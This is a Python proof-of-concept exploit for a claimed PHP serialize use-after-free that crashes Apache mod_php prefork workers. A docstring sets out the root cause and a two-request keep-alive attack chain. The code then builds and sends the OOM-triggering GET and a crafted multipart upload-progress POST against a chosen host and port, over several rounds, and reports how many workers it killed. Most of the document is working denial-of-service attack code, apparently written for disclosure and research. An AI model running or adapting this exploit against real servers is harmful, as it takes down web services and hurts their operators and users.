#!/usr/bin/env python3
"""
PoC: PHP BG(serialize) Use-After-Free → DoS (CVE pending)

Vulnerability: zend_bailout() during serialize() leaves BG(serialize).data
pointing to freed ZMM heap memory. On the next request (same Apache prefork
worker via keep-alive), the upload-progress callback fires during
php_hash_environment() — BEFORE Basic RINIT resets BG(serialize). The callback
calls php_session_encode() → php_var_serialize() → php_var_serialize_init(),
which sees level=1, lock=0, and reuses the dangling pointer. The freed address
now contains ZMM chunk bookkeeping (non-zero), so the HashTable.arData is
garbage → SIGSEGV or infinite loop → worker killed by max_execution_time.

Requirements:
  - Apache mod_php with prefork MPM (worker survives bailout)
  - session.upload_progress.enabled = On (PHP default)
  - memory_limit low enough for OOM during serialize() (16M in this PoC)
  - Any PHP endpoint that can be reached (no auth needed)

Attack chain (2 HTTP requests on one keep-alive TCP connection):
  1. GET  trigger_serialize_bailout.php — OOM mid-serialize → dirty BG(serialize)
  2. POST target.php            — multipart with PHP_SESSION_UPLOAD_PROGRESS
                                  → session encode hits stale pointer → crash

No pre-existing session needed — PHP's upload-progress handler creates one
automatically when it sees a PHPSESSID cookie + PHP_SESSION_UPLOAD_PROGRESS field.

Tested on: PHP 8.3.20 / Apache 2.4.62 / WordPress 6.7 (wordpress:6.7-php8.3-apache)
"""

import socket
import sys
import time
import random
import string

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
NUM_ROUNDS = int(sys.argv[3]) if len(sys.argv) > 3 else 5


def recv_http(sock, timeout=10):
    sock.settimeout(timeout)
    data = b""
    try:
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                return data
            data += chunk
    except (socket.timeout, ConnectionError, OSError):
        return data

    header_end = data.index(b"\r\n\r\n") + 4
    headers = data[:header_end].decode("latin-1", errors="replace").lower()
    body = data[header_end:]

    for line in headers.split("\r\n"):
        if line.startswith("content-length:"):
            cl = int(line.split(":", 1)[1].strip())
            while len(body) < cl:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    body += chunk
                except (socket.timeout, ConnectionError, OSError):
                    break
            return data[:header_end] + body

    if "transfer-encoding: chunked" in headers:
        end = time.time() + timeout
        while b"0\r\n\r\n" not in body:
            if time.time() > end:
                break
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                body += chunk
            except (socket.timeout, ConnectionError, OSError):
                break
        return data[:header_end] + body

    return data


def http_get(sock, path, cookie=None):
    cookie_hdr = f"Cookie: PHPSESSID={cookie}\r\n" if cookie else ""
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: keep-alive\r\n"
        f"{cookie_hdr}"
        f"\r\n"
    ).encode()
    sock.sendall(req)
    return recv_http(sock)


def extract_body(resp):
    if resp and b"\r\n\r\n" in resp:
        return resp.decode("latin-1", errors="replace").split("\r\n\r\n", 1)[1]
    return ""


def extract_pid(body):
    for line in body.strip().split("\n"):
        if "pid:" in line.lower():
            return line.split(":")[-1].strip()
    return None


def send_upload_progress_post(sock, session_id):
    boundary = "----Boundary" + "".join(
        random.choices(string.ascii_letters + string.digits, k=16)
    )
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"dos_test\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n"
        f"\r\n"
    ).encode()
    file_data = b"X" * 32768
    end_boundary = f"\r\n--{boundary}--\r\n".encode()
    total = len(body) + len(file_data) + len(end_boundary)

    headers = (
        f"POST /poc/target.php HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: keep-alive\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\n"
        f"\r\n"
    ).encode()

    sock.sendall(headers + body + file_data + end_boundary)
    return recv_http(sock, timeout=12)


def kill_worker():
    session_id = "dos" + "".join(random.choices("0123456789abcdef", k=29))
    pid = None

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((HOST, PORT))

        # 1) OOM during serialize() — leaves BG(serialize) = {level=1, data=<freed_ptr>}
        resp = http_get(sock, "/poc/trigger_serialize_bailout.php")
        body = extract_body(resp)
        pid = extract_pid(body)

        # 2) Upload-progress POST — MUST be the immediate next request (no
        #    intermediate request, or Basic RINIT would reset the dirty state).
        #    The upload-progress callback fires during php_hash_environment(),
        #    before zend_activate_modules() / Basic RINIT.
        #    No pre-existing session needed: PHP creates one on the fly when
        #    it sees PHPSESSID cookie + PHP_SESSION_UPLOAD_PROGRESS field.
        resp = send_upload_progress_post(sock, session_id)

        sock.close()

        if not resp or len(resp) == 0:
            return pid, True

        if b"500" in resp[:50] or b"502" in resp[:50]:
            return pid, True

        return pid, False

    except (ConnectionError, OSError, socket.timeout):
        return pid, True


def main():
    print("=" * 60)
    print("  PHP serialize UAF → DoS")
    print("  BG(serialize) stale pointer via zend_bailout()")
    print("=" * 60)
    print(f"  Target: {HOST}:{PORT}")
    print(f"  Rounds: {NUM_ROUNDS}")
    print()

    killed = 0

    for i in range(NUM_ROUNDS):
        pid, dead = kill_worker()
        status = "KILLED" if dead else "survived"
        print(f"  [{i+1}/{NUM_ROUNDS}] Worker PID {pid}: {status}")
        if dead:
            killed += 1
        time.sleep(0.5)

    print()
    print(f"  Result: {killed}/{NUM_ROUNDS} workers killed "
          f"({killed * 100 // NUM_ROUNDS}%)")

    if killed > 0:
        print()
        print("  Root cause:")
        print("    zend_bailout() longjmp skips PHP_VAR_SERIALIZE_DESTROY,")
        print("    leaving BG(serialize) = {level=1, data=<freed_heap>}.")
        print("    PHP_RSHUTDOWN_FUNCTION(basic) does NOT reset it.")
        print("    On the next request, php_hash_environment() runs BEFORE")
        print("    zend_activate_modules() (Basic RINIT), so the upload-progress")
        print("    callback sees the stale state and dereferences the freed pointer.")
        print()
        print("  Why 100% reliable:")
        print("    zend_mm_shutdown(full=false) reuses the main chunk without")
        print("    zeroing it. The stale pointer lands on ZMM bookkeeping data")
        print("    (free_map/map[]), which is always non-zero. Interpreting it")
        print("    as a HashTable yields arData=<garbage> → SIGSEGV or infinite")
        print("    loop killed by max_execution_time.")


if __name__ == "__main__":
    main()
